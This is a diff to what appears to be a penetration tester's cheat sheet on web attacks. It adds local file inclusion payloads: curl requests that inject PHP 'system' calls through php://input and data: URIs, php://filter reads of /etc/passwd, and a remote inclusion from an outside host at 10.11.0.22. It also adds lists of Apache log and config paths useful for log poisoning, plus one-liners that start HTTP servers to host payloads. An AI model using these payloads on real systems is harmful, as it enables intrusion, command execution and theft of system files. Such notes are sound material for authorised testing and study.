@@ -79,10 +79,16 @@ curl -X PUT http://$target/test.jsp/ -d @- < test.jsp
 
 ## LFI 
 ```bash
-curl -s --data "<?system('ls -la');?>" "http://$target/example.php?ACS_path=php://input%00"
+curl -s --data "<?php system('whoami');?>" "http://$target/example.php?ACS_path=php://input%00"
 ```
 ```bash
 curl "http://$target/example.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00"
+```
+```bash
+curl "http://$target/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd%00"
+```
+```
+curl "http://$target/example.php?page=http://10.11.0.22/menu.php?file=data:text/plain,<?php system('whoami') ?>"
 ```
 ```bash
 bash $pwd/tools/web/Kadimus/bin/kadimus -u $target/?pg=contact -A "Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/73.0" --threads 10 --connect-timeout 10 --retry-times 1 
@@ -112,7 +118,7 @@ nmap -p 80 --script dns-brute.nse $target
 python dnscan.py -d $target -w ./subdomains-10000.txt
 ```
 
-## Logs
+## LFI paths
 
 RHEL / Red Hat / CentOS / Fedora Linux Apache log file location   
 ```
@@ -126,6 +132,7 @@ Debian / Ubuntu Linux Apache log file location
 ```
 /var/log/apache2/access.log
 ```
+```
 /var/log/apache2/error.log
 ```
 
@@ -137,7 +144,7 @@ FreeBSD Apache log file location
 /var/log/httpd-error.log
 ```
 
-# Config
+Config
 ```
 /usr/local/etc/apache2/httpd.conf
 ```
@@ -148,7 +155,7 @@ FreeBSD Apache log file location
 /etc/httpd/conf/httpd.conf
 ```
 
-# Windows web roots
+Windows web roots
 ```
 C:/xampp/htdocs/
 ```
@@ -157,4 +164,22 @@ C:/wamp/www/
 ```
 ```
 C:/Inetpub/wwwroot/
+```
+
+
+## Web Servers 
+```
+python -m SimpleHTTPServer 8080
+```
+```
+python3 -m http.server 8080
+```
+```
+php -S 0.0.0.0:8080
+```
+```
+ruby -run -e httpd . -p 8080
+```
+```
+busybox httpd -f -p 8080
 ```
